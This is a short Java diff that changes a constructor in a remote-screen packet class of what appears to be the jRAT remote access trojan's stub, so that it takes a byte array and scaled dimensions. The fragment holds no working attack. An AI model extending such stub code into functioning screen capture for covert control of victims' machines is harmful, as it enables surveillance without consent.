@@ -2,8 +2,8 @@ package pro.jrat.stub.packets.outgoing;
 
 public class Packet18OneRemoteScreen extends Packet17RemoteScreen {
 
-	public Packet18OneRemoteScreen(int width, int height, int x, int y) {
-		super(width, height, x, y);
+	public Packet18OneRemoteScreen(byte[] array, int scaledWidth, int scaledHeight) {
+		super(array, scaledWidth, scaledHeight);
 	}
 
 	@Override
